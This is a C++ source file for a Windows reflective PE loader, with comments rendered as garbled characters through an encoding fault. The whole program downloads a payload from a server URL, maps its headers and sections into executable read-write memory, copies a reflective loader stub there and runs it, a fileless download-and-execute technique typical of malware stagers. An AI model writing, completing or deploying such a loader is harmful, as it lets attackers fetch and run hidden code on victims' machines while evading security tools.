// ���ˌ^PE���[�_�[

#include "injector.h"

Arg arg;

 // �G���g���|�C���g
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    
    // URL���\�z
    std::wstring url = makeUrl(arg);

    // �t�@�C���T�[�o�[����y�C���[�h���X�e�[�W���O
    std::vector<BYTE> downloadedPayload;
    StagingPayload(url,downloadedPayload);
    PBYTE payload = reinterpret_cast<PBYTE>(downloadedPayload.data());

    // PE�w�b�_�̎擾
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + reinterpret_cast<PIMAGE_DOS_HEADER>(payload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;

    // ���������m��
    PBYTE baseAddress = reinterpret_cast<PBYTE>(VirtualAlloc(nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

    // ���ˌ^���[�_�[�̈������i�[
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pBase = baseAddress;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // �w�b�_�[���R�s�[
    RtlMoveMemory(baseAddress, payload, pOldOptionalHeader->SizeOfHeaders, nullptr);

    // �Z�N�V�������R�s�[
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            RtlMoveMemory(baseAddress + pSectionHeader->VirtualAddress, payload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr);
        }
    }

    // ���ˌ^���[�_�[����������
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    RtlMoveMemory(pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr);

    // ���ˌ^���[�_�[�̈�������������
    LPVOID pMappingData = VirtualAlloc(nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(pMappingData, &data, sizeof(MANUAL_MAPPING_DATA), nullptr);

    // ReflectiveLoader�̃A�h���X���֐��|�C���^�Ƃ��ăL���X�g
    ReflectiveLoaderFunc reflectiveLoaderFunc = reinterpret_cast<ReflectiveLoaderFunc>(pReflectiveLoader);

    // ���ˌ^���[�_�[�����s
    reflectiveLoaderFunc(pMappingData);

    return 0;
}